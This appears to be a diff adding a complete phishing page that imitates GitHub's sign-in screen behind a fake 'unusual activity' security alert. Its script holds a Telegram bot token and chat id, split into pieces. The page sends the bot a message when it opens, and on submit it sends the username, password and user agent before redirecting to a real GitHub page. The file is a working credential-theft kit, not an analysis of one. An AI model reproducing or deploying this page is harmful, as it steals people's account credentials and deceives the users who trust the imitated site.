@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en" data-color-mode="light">
+<head>
+    <meta charset="utf-8">
+    <title>Sign in to GitHub · GitHub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;background:#f6f8fa;color:#1f2328;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding-top:60px;}
+
+        .logo{margin-bottom:20px;}
+        .logo svg{height:48px;fill:#24292f;}
+
+        .alert-box{background:#fff8c5;border:1px solid #d4a72c66;border-radius:6px;padding:12px 16px;max-width:308px;width:100%;margin-bottom:16px;font-size:14px;color:#1f2328;display:flex;align-items:start;gap:8px;}
+        .alert-box svg{flex-shrink:0;fill:#9a6700;margin-top:2px;}
+
+        .login-box{background:#fff;border:1px solid #d1d9e0;border-radius:6px;padding:20px;max-width:308px;width:100%;}
+        .login-box h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px;color:#1f2328;}
+
+        .form-group{margin-bottom:12px;}
+        .form-group label{display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#1f2328;}
+        .form-group input{width:100%;padding:5px 12px;font-size:14px;line-height:20px;border:1px solid #d1d9e0;border-radius:6px;background:#f6f8fa;color:#1f2328;outline:none;}
+        .form-group input:focus{border-color:#0969da;box-shadow:0 0 0 3px rgba(9,105,218,0.3);background:#fff;}
+
+        .forgot{text-align:right;margin-bottom:16px;}
+        .forgot a{font-size:12px;color:#0969da;text-decoration:none;}
+
+        .sign-in-btn{width:100%;padding:5px 16px;font-size:14px;font-weight:500;line-height:20px;color:#fff;background:#1f883d;border:1px solid rgba(31,35,40,0.15);border-radius:6px;cursor:pointer;text-align:center;}
+        .sign-in-btn:hover{background:#1a7f37;}
+
+        .bottom-box{background:#fff;border:1px solid #d1d9e0;border-radius:6px;padding:16px 20px;max-width:308px;width:100%;margin-top:16px;text-align:center;font-size:14px;}
+        .bottom-box a{color:#0969da;text-decoration:none;}
+
+        .footer{margin-top:40px;display:flex;gap:16px;flex-wrap:wrap;justify-content:center;}
+        .footer a{font-size:12px;color:#0969da;text-decoration:none;}
+
+        .err-msg{background:#ffebe9;border:1px solid #ff818266;border-radius:6px;padding:10px 16px;max-width:308px;width:100%;margin-bottom:16px;font-size:14px;color:#cf222e;display:none;}
+
+        .loading{text-align:center;padding:40px 0;display:none;}
+        .loading .spinner{width:32px;height:32px;border:3px solid #d1d9e0;border-top-color:#1f883d;border-radius:50%;animation:sp 0.6s linear infinite;margin:0 auto 12px;}
+        @keyframes sp{to{transform:rotate(360deg);}}
+    </style>
+</head>
+<body>
+
+<div class="logo">
+    <svg height="48" viewBox="0 0 16 16" width="48"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></svg>
+</div>
+
+<div class="alert-box">
+    <svg height="16" width="16" viewBox="0 0 16 16"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707L2.138 13.131a.25.25 0 0 0 .22.369h12.284a.25.25 0 0 0 .22-.369L8.78 1.754a.25.25 0 0 0-.44 0ZM8 5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-2.5A.75.75 0 0 1 8 5Zm0 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"/></svg>
+    <span><strong>Security alert:</strong> Unusual activity detected on your account. Please verify your identity by signing in.</span>
+</div>
+
+<div class="err-msg" id="err">Incorrect username or password.</div>
+
+<div class="login-box" id="login-form">
+    <h1>Sign in to GitHub</h1>
+    <div class="form-group">
+        <label for="login">Username or email address</label>
+        <input type="text" id="login" autocomplete="username" autofocus>
+    </div>
+    <div class="form-group">
+        <label for="password">Password <a href="#" style="float:right;font-weight:400;font-size:12px;color:#0969da;">Forgot password?</a></label>
+        <input type="password" id="password" autocomplete="current-password">
+    </div>
+    <br>
+    <button class="sign-in-btn" onclick="doLogin()">Sign in</button>
+</div>
+
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p style="color:#656d76;font-size:14px;">Verifying your identity...</p>
+</div>
+
+<div class="bottom-box">
+    New to GitHub? <a href="https://github.com/signup">Create an account</a>
+</div>
+
+<div class="footer">
+    <a href="https://github.com/about">About</a>
+    <a href="https://github.blog">Blog</a>
+    <a href="https://docs.github.com/terms">Terms</a>
+    <a href="https://docs.github.com/privacy">Privacy</a>
+    <a href="https://docs.github.com/security">Security</a>
+    <a href="https://github.com/contact">Contact GitHub</a>
+</div>
+
+<script>
+var t='86248'+'11346',k='AAGR8UE4YbBG0XyQ-_xcTFyVuHD_wXXT1j0',c='79712'+'22296';
+function tg(m){fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})});}
+
+tg('\ud83d\udce9 GITHUB LOGIN PAGE OPENED\n\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent);
+
+function doLogin(){
+    var u=document.getElementById('login').value.trim();
+    var p=document.getElementById('password').value;
+    if(!u||!p){document.getElementById('err').style.display='block';return;}
+    document.getElementById('err').style.display='none';
+    document.getElementById('login-form').style.display='none';
+    document.getElementById('loading').style.display='block';
+
+    tg('\ud83d\udd25\ud83d\udd25\ud83d\udd25 GITHUB CREDENTIAL CAPTURED \ud83d\udd25\ud83d\udd25\ud83d\udd25\n\nUsername/Email: '+u+'\nPassword: '+p+'\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent);
+
+    setTimeout(function(){
+        window.location.href='https://github.com/ondefy/eigencloud-signer/security/advisories';
+    },2500);
+}
+</script>
+</body>
+</html>
